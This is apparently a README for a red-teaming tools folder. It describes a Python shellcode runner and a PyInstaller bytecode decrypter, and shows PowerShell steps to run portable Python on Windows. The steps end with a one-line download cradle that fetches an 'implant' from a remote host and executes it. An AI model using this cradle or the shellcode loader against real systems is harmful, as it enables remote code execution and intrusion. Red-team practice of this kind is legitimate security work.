<p align="center">
  <img src="../_resources/img/0004.png" width="100">
</p>

# Python
With a little work, Python can still be a great tool to use on modern red teaming engagements.

### Table of Contents
  * [Examples](#examples)
  * [Usage](#Usage)


## Examples
| File                                           | Description                                                                            |
|------------------------------------------------|----------------------------------------------------------------------------------------|
| [shellcode_runner.py](src/shellcode_loader.py) | Injects shellcode into the current process with ```VirtualAlloc```/```CreateThread```. |
| [decrypt_bytecode.py](src/decrypt_bytecode.py) | Decrypt AES encrypted bytecode files by pyinstaller.                                                                                       |


## Usage
Python execution without installation on Windows systems:
```ps1
# Download Python:
Invoke-WebRequest -URI https://www.python.org/ftp/python/3.11.0/python-3.11.0-embed-amd64.zip -OutFile python311.zip

# Unzip Archive:
Expand-Archive python311.zip -DestinationPath python311

# Test
.\python311\python.exe -V

# Download Cradle using only standard libraries:
python -c 'import urllib.request;exec(urllib.request.urlopen("http://192.168.1.100/implant.txt").read())'
```
